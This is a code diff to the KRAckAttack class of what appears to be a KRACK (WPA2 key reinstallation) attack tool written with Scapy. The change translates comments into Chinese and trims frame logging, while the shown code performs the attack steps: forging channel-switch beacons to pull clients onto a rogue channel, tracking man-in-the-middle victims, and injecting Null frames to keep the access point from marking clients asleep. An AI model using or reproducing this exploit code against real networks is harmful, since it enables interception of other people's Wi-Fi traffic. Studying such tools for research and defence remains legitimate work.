@@ -638,42 +638,29 @@ class KRAckAttack():
 		p = self.sock_real.recv()
 		if p == None: 
 			return
-
-		# 1. Handle frames sent TO the real AP
+		# 1. 處理送到原 AP 的 frames
 		if p.addr1 == self.apmac:
-			# If it's an authentication to the real AP, always display it ...
 			if p.haslayer(Dot11Auth):
-				print_rx(INFO, "Real channel ", p, color="orange")
-
-				# ... with an extra clear warning when we wanted to MitM this specific client
+				# 額外的警告攻擊正在進行中
 				if self.clientmac == p.addr2:
 					log(WARNING, "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.clientmac)
-
+				
 				if p.addr2 in self.clients: del self.clients[p.addr2]
 				# Send one targeted beacon pair (should be retransmitted in case of failure), and one normal broadcast pair
 				self.send_csa_beacon(target=p.addr2)
 				self.send_csa_beacon()
 				self.clients[p.addr2] = ClientState(p.addr2)
 				self.clients[p.addr2].update_state(ClientState.Connecting)
-
-			# Remember association request to save connection parameters
+			# 記住 association request，紀錄連線時所需要的參數
 			elif p.haslayer(Dot11AssoReq):
 				if p.addr2 in self.clients: self.clients[p.addr2].assocreq = p
-
-			# Clients sending a deauthentication or disassociation to the real AP are also interesting ...
+			# client端自己傳送 deauthentication 或 disassociation 給原 AP
 			elif p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
-				print_rx(INFO, "Real channel ", p)
+				# print_rx(INFO, "Real channel ", p)
 				if p.addr2 in self.clients: del self.clients[p.addr2]
-
-			# Display all frames sent from a MitM'ed client
-			elif p.addr2 in self.clients:
-				print_rx(INFO, "Real channel ", p)
-
 			# For all other frames, only display them if they come from the targeted client
 			elif self.clientmac is not None and self.clientmac == p.addr2:
 				print_rx(INFO, "Real channel ", p)
-
-
 			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
 			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
 				log(WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
@@ -738,9 +725,6 @@ class KRAckAttack():
 				self.last_rogue_beacon = time.time()
 			# Display all frames sent to the targeted client
 			if self.clientmac is not None and p.addr1 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p)
-			# And display all frames sent to a MitM'ed client
-			elif p.addr1 in self.clients:
 				print_rx(INFO, "Rogue channel", p)
 
 		# 2. Handle frames sent TO the AP
